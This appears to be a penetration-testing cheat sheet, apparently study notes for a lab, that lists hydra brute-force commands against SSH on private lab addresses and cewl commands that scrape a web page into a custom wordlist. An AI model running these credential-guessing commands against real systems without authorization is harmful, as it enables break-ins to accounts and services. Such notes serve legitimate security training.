1. If there is SSH/FTP/SMB try for common passwords 
    - If no usernames try defaults 
```bash
sudo hydra -L /home/kali/commoncreds/user.txt -P /home/kali/commoncreds/pass.txt ssh://192.168.220.39
```

2. If there is SSH/FTP/smb thast needs access and you have usernames(eg:patrick), try below two
ðŸ”´ Pay attention to Nmap **Auth-Owners** or enumerate port 113
```
patrick:patrick
```

```bash
sudo hydra -l patrick -P /home/kali/commoncreds/pass.txt ssh://192.168.220.39
```

```bash
sudo hydra -l patrick -P /usr/share/wordlists/rockyou.txt ssh://192.168.220.39
```

3. Last resort
```bash
cewl http://192.168.233.61:8081/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://192.168.233.61:8081/ | grep -v CeWL  >> custom-wordlist.txt
```

```bash
sudo hydra -L custom-wordlist.txt -P custom-wordlist.txt ssh://192.168.220.39
```


5.  If you got an access key or password and it doesnt work, try decoding it.
